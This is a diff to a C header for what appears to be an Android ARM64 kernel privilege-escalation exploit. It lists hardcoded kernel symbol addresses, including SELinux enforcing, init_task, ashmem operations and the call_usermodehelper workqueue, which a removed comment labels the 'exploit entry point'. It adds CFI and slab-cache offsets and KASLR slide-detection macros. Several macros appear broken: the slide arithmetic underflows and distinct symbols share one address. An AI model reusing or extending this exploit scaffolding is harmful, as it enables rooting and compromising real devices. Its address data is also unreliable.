@@ -36,16 +36,35 @@
  * Extracted from vmlinux.elf via aarch64-linux-android-nm
  * ============================================================================ */
 
-/* Exploit entry point - workqueue task hijacking */
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0xffffffc00816ec08UL
+/* Without _OFF suffix (for use with text_addr/data_addr macros) */
+#define CALL_USERMODEHELPER_EXEC_WORK             0xffffffc00816ec08UL
+#define NOOP_LLSEEK                               0xffffffc008556884UL
+#define COPY_SPLICE_READ                          0xffffffc0085ca2dcUL
+#define CONFIGFS_READ_ITER                        0xffffffc00867f0ccUL
+#define CONFIGFS_BIN_WRITE_ITER                   0xffffffc00867fbf0UL
+#define ASHMEM_IOCTL                              0xffffffc00918e290UL
+#define ASHMEM_COMPAT_IOCTL                       0xffffffc00918e940UL
+#define ASHMEM_MMAP                               0xffffffc00918e9a0UL
+#define ASHMEM_OPEN                               0xffffffc00918ec90UL
+#define ASHMEM_RELEASE                            0xffffffc00918ed30UL
+#define ASHMEM_SHOW_FDINFO                        0xffffffc00918ee54UL
+#define ASHMEM_FOPS                               0xffffffc00a16b0f8UL
+#define ASHMEM_MISC_FOPS                          0xffffffc00a16b0f8UL
+#define KMALLOC_CACHES                            0xffffffc00a1d5250UL
+#define ANON_PIPE_BUF_OPS                         0xffffffc009fe61b0UL
+#define SYSTEM_UNBOUND_WQ                         0xffffffc00ab807d8UL
+#define LOGGERS                                   0xffffffc00ab81d50UL
+#define INIT_TASK                                 0xffffffc00acc5e80UL
+#define ROOT_TASK_GROUP                           0xffffffc00addbac0UL
+#define SELINUX_ENFORCING                         0xffffffc00ab37404UL
+#define SYSCTL_BOOTID                             0xffffffc00af4c3a1UL
 
-/* File operations - splice read and seek */
+/* With _OFF suffix (for offsets from base addresses) */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0xffffffc00816ec08UL
 #define NOOP_LLSEEK_OFF                           0xffffffc008556884UL
 #define COPY_SPLICE_READ_OFF                      0xffffffc0085ca2dcUL
 #define CONFIGFS_READ_ITER_OFF                    0xffffffc00867f0ccUL
 #define CONFIGFS_BIN_WRITE_ITER_OFF               0xffffffc00867fbf0UL
-
-/* ashmem device - primary attack surface */
 #define ASHMEM_IOCTL_OFF                          0xffffffc00918e290UL
 #define ASHMEM_COMPAT_IOCTL_OFF                   0xffffffc00918e940UL
 #define ASHMEM_MMAP_OFF                           0xffffffc00918e9a0UL
@@ -53,32 +72,39 @@
 #define ASHMEM_RELEASE_OFF                        0xffffffc00918ed30UL
 #define ASHMEM_SHOW_FDINFO_OFF                    0xffffffc00918ee54UL
 #define ASHMEM_FOPS_OFF                           0xffffffc00a16b0f8UL
-#define ASHMEM_MISC_FOPS_OFF                      0xffffffc00a16b0f8UL
-
-/* Memory management */
 #define KMALLOC_CACHES_OFF                        0xffffffc00a1d5250UL
-
-/* Pipe operations */
 #define ANON_PIPE_BUF_OPS_OFF                     0xffffffc009fe61b0UL
-
-/* Workqueue and logging infrastructure */
 #define SYSTEM_UNBOUND_WQ_OFF                     0xffffffc00ab807d8UL
 #define LOGGERS_OFF                               0xffffffc00ab81d50UL
-#define SLIDE_LOGGERS_0_1_OFF                     0xffffffc00ab81d50UL
-
-/* Process management */
 #define INIT_TASK_OFF                             0xffffffc00acc5e80UL
-
-/* Task groups and scheduling */
 #define ROOT_TASK_GROUP_OFF                       0xffffffc00addbac0UL
-
-/* Security - SELinux */
 #define SELINUX_ENFORCING_OFF                     0xffffffc00ab37404UL
-
-/* Boot ID sysctl for slide detection */
 #define SYSCTL_BOOTID_OFF                         0xffffffc00af4c3a1UL
-#define SLIDE_SYSCTL_BOOTID_OFF                   0xffffffc00af4c3a1UL
-#define SLIDE_BOOTID_POINTER_OFF                  0xffffffc00af4c3a1UL
+
+/* Image-only addresses (for slide detection - without kernel base offset) */
+#define CALL_USERMODEHELPER_EXEC_WORK_IMAGE       0x816ec08UL
+#define NOOP_LLSEEK_IMAGE                         0x8556884UL
+#define COPY_SPLICE_READ_IMAGE                    0x85ca2dcUL
+#define CONFIGFS_READ_ITER_IMAGE                  0x867f0ccUL
+#define CONFIGFS_BIN_WRITE_ITER_IMAGE             0x867fbf0UL
+#define ASHMEM_IOCTL_IMAGE                        0x918e290UL
+#define ASHMEM_COMPAT_IOCTL_IMAGE                 0x918e940UL
+#define ASHMEM_MMAP_IMAGE                         0x918e9a0UL
+#define ASHMEM_OPEN_IMAGE                         0x918ec90UL
+#define ASHMEM_RELEASE_IMAGE                      0x918ed30UL
+#define ASHMEM_SHOW_FDINFO_IMAGE                  0x918ee54UL
+#define ASHMEM_FOPS_IMAGE                         0xa16b0f8UL
+#define KMALLOC_CACHES_IMAGE                      0xa1d5250UL
+#define ANON_PIPE_BUF_OPS_IMAGE                   0x9fe61b0UL
+#define SYSTEM_UNBOUND_WQ_IMAGE                   0xab807d8UL
+#define LOGGERS_IMAGE                             0xab81d50UL
+#define INIT_TASK_IMAGE                           0xacc5e80UL
+#define ROOT_TASK_GROUP_IMAGE                     0xaddbac0UL
+#define SELINUX_ENFORCING_IMAGE                   0xab37404UL
+#define SYSCTL_BOOTID_IMAGE                       0xaf4c3a1UL
+#define NFULNL_LOGGER_OBJECT_IMAGE                0xab81d50UL
+#define NFULNL_LOGGER_NAME_IMAGE                  0xab81d50UL
+#define RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE       0xaf4c3a1UL
 
 /* ============================================================================
  * CFI JUMP TABLE OFFSETS (Control Flow Integrity Protection)
@@ -98,16 +124,19 @@
 #define COPY_SPLICE_READ_CFI_JT                   0xffffffc00979a0c0UL
 
 /* ============================================================================
- * PHYSICAL MEMORY LAYOUT
- * ARM64 kernel physical memory addressing
+ * KERNEL ADDRESS CALCULATIONS
  * ============================================================================ */
 
+#define P0_PAGE_OFFSET                            0xffffff8000000000UL
+#define P0_KERNEL_TEXT_BASE                       0xffffffc000000000UL
+#define P0_KERNEL_PHYS_BASE                       0x80000000UL
 #define P0_PHYS_OFFSET                            0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD                       0x80000000ULL
 
 /* Virtual kernel base address */
 #define KERNEL_BASE                               0xffffffc000000000ULL
-#define KIMAGE_TEXT_BASE                          0xffffffc000000000ULL
+#define KIMAGE_VADDR                              0xffffffc000000000UL
+#define KIMAGE_TEXT_BASE                          0xffffffc000000000UL
 #define KERNEL_OFFSET_BITS                        64
 #define KERNEL_VA_BITS                            48
 
@@ -115,7 +144,6 @@
  * MEMORY CONFIGURATION
  * ============================================================================ */
 
-#define PAGE_SIZE                                 0x1000UL
 #define PAGE_SHIFT                                12
 #define PAGE_MASK                                 0xfffffffffffff000ULL
 
@@ -124,7 +152,7 @@
 #define DIRECT_MAP_PAGES                          ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
 
 #define VMEMMAP_START                             0xfffffe0000000000UL
-#define VMEMMAP_END                               (VMEMMAP_START + DIRECT_MAP_PAGES * 0x40)
+#define VMEMMAP_SIZE                              (DIRECT_MAP_PAGES * 0x40UL)
 
 /* ============================================================================
  * STRUCTURE MEMBER OFFSETS
@@ -240,9 +268,11 @@
 #define STRUCT_PAGE_TYPE_OFF                      0x30UL
 #define STRUCT_SLAB_CACHE_OFF                     0x18UL
 
-/* struct kmem_cache */
-#define KMALLOC_CACHE_SLOT(type, idx)             (KMALLOC_CACHES + ((type) * 0x4c0) + ((idx) * 0x40))
-#define KMALLOC_BUCKETS                           16
+/* struct kmem_cache - memory allocation */
+#define KMALLOC_SHIFT_LOW                         3
+#define KMALLOC_SHIFT_HIGH                        15
+#define KMALLOC_BUCKETS                           (KMALLOC_SHIFT_HIGH - KMALLOC_SHIFT_LOW + 1)
+#define KMALLOC_CACHE_SLOT(type, idx)             (KMALLOC_CACHES + ((type) * 16UL * 0x40UL) + ((idx) * 0x40UL))
 #define KMALLOC_PIPE_INDEX                        11
 #define KMALLOC_CGROUP_TYPE                       1
 #define KMALLOC_CGROUP_PIPE_SLOT                  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
@@ -285,6 +315,17 @@
 #define SLIDE_TRACEFS_EVENT_ID                    106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF           0x000dbd9cUL
 #define SLIDE_PSELECT_WORD_SHIFT                  0
+#define SLIDE_PSELECT_NFDS                        0xffffffc00a000000UL
+
+/* Slide detection macros */
+#define SLIDE_NFULNL_LOGGER_NAME                  (P0_PAGE_OFFSET | (NFULNL_LOGGER_NAME_IMAGE - KIMAGE_TEXT_BASE + P0_KERNEL_TEXT_BASE))
+#define SLIDE_NFULNL_LOGGER_OBJECT                (P0_PAGE_OFFSET | (NFULNL_LOGGER_OBJECT_IMAGE - KIMAGE_TEXT_BASE + P0_KERNEL_TEXT_BASE))
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR       (P0_PAGE_OFFSET | (RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE - KIMAGE_TEXT_BASE + P0_KERNEL_TEXT_BASE))
+#define SLIDE_INIT_TASK                           (P0_PAGE_OFFSET | (INIT_TASK_IMAGE - KIMAGE_TEXT_BASE + P0_KERNEL_TEXT_BASE))
+#define SLIDE_ROOT_TASK_GROUP                     (P0_PAGE_OFFSET | (ROOT_TASK_GROUP_IMAGE - KIMAGE_TEXT_BASE + P0_KERNEL_TEXT_BASE))
+#define SLIDE_SYSCTL_BOOTID                       (P0_PAGE_OFFSET | (SYSCTL_BOOTID_IMAGE - KIMAGE_TEXT_BASE + P0_KERNEL_TEXT_BASE))
+#define SLIDE_WAITER_TREE_LEFT                    SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR
+#define SLIDE_WAITER_TASK                         SLIDE_INIT_TASK
 
 /* ============================================================================
  * ARCHITECTURE SPECIFICS
